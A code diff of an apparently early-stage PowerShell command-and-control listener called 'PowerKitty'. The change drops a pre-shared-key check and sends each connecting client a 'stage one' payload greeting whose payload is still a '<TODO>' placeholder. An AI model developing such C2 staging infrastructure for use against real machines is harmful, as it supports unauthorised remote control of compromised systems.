@@ -52,9 +52,7 @@ Function Global:New-Listerner()
 		
 		if($client = $listener.AcceptTcpClient())
 		{
-			$Stream = $client.GetStream()
-			$StreamWriter = New-Object System.IO.StreamWriter($Stream)
-			$StreamReader = New-Object System.IO.StreamReader($Stream)
+			
 			# add agent to listerner
 			#$thisListerner = Get-Listerner -UUID ($obj.UUID.toString())
 			#$agentCount    = $thisListerner.AGENTCOUNT++
@@ -73,26 +71,19 @@ Function Global:New-Listerner()
 			# build our logic for  onboarding connections
 			[void]$PowerShell.AddScript({
 				
-			
-				if($StreamReader.ReadLine() == "Onboard:$PSK")
-				{
-					$StreamWriter.WriteLine("Purr! Welcome to stage one, here is your payload: <TODO>") | Out-Null
-				}
-				elseif($StreamReader.ReadLine() == "PowerKitty-Agent:$PSK")
-				{
-					$StreamWriter.WriteLine("Purrrrr! Adding you to connection list! :) ") | Out-Null
-				} 
-				else
-				{
-					# this is not a verified powerkitty connection
-					$StreamWriter.WriteLine("HISSS! >.<") | Out-Null
-				}
+
+				$Stream = $client.GetStream()
+				$StreamWriter = New-Object System.IO.StreamWriter($Stream)
+				$StreamReader = New-Object System.IO.StreamReader($Stream)
 				
+				$StreamWriter.WriteLine("Purr! Welcome to stage one, here is your payload: <TODO>") | Out-Null
+
 				# test stuff
 				$StreamWriter.Close()
+				$StreamReader.Close()
 
 			})
-			$AsyncObject = $PowerShell.BeginInvoke($StreamReader,$StreamWriter)
+			$AsyncObject = $PowerShell.BeginInvoke($client)
 			"sock!"
 		}
 		
